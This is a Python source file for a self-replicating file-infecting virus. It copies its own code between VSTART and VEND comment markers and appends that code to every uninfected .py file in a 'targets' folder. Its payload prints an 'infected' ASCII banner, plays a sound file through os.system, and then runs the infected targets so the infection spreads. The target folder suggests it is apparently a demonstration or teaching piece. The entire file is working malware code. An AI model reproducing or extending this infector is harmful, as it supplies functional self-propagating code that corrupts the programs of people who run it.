######### VSTART

######### module imports

import sys
import re
import glob
import os

#########

######### declaring necessary vars and bools and reading the vfile

vcode = []

file = sys.argv[0]

vfile = open(file, 'r')
lines = vfile.readlines()
vfile.close()

checkVSTART = False

#########

######### copying virus to list using comment tags

for ln in lines:
    if(re.search("^######### VSTART", ln)):
        checkVSTART = True

    if checkVSTART == True:
        vcode.append(ln)

    if re.search("^######### VEND", ln):
        break

#########

######### scanning for potential target files

targets = glob.glob(".\\targets\\*.py")

#########

######### infecting programs

for t in targets:
    target = open(t, "r")
    tcode = target.readlines()
    target.close()

    infected = False
    for line in tcode:
        if re.search("^######### VSTART", line):
            infected = True
            break
    if not infected:
        newcode = []
        newcode = tcode
        newcode.extend(vcode)
        target = open(t, "w")
        target.writelines(newcode)
        target.close()

#########

######### PAYLOAD

print(''' __      __     _____    __________   _______    .___   _______      ________    ._. ._. ._. ._. ._. ._. ._.       
/  \    /  \   /  _  \   \______   \  \      \   |   |  \      \    /  _____/    | | | | | | | | | | | | | |       
\   \/\/   /  /  /_\  \   |       _/  /   |   \  |   |  /   |   \  /   \  ___    | | | | | | | | | | | | | |       
 \        /  /    |    \  |    |   \ /    |    \ |   | /    |    \ \    \_\  \    \|  \|  \|  \|  \|  \|  \|       
  \__/\  /   \____|__  /  |____|_  / \____|__  / |___| \____|__  /  \______  /    __  __  __  __  __  __  __       
       \/            \/          \/          \/                \/          \/     \/  \/  \/  \/  \/  \/  \/       
.___   _______    ___________ ___________ _________   ___________ ___________ ________      __________  _____.___. 
|   |  \      \   \_   _____/ \_   _____/ \_   ___ \  \__    ___/ \_   _____/ \______ \     \______   \ \__  |   | 
|   |  /   |   \   |    __)    |    __)_  /    \  \/    |    |     |    __)_   |    |  \     |    |  _/  /   |   | 
|   | /    |    \  |     \     |        \ \     \____   |    |     |        \  |    `   \    |    |   \  \____   | 
|___| \____|__  /  \___  /    /_______  /  \______  /   |____|    /_______  / /_______  /    |______  /  / ______| 
              \/       \/             \/          \/                      \/          \/            \/   \/        
__________  _____.___. __________   ____ ___    _________  ____                                                    
\______   \ \__  |   | \______   \ |    |   \  /   _____/ /_   |                                                   
 |     ___/  /   |   |  |       _/ |    |   /  \_____  \   |   |                                                   
 |    |      \____   |  |    |   \ |    |  /   /        \  |   |                                                   
 |____|      / ______|  |____|_  / |______/   /_______  /  |___|                                                   
             \/                \/                     \/                                                           ''')

os.system("targetaffectedtest.mp3")

#########
        
######### VEND

for target in targets:
    os.system("python %s" % target)
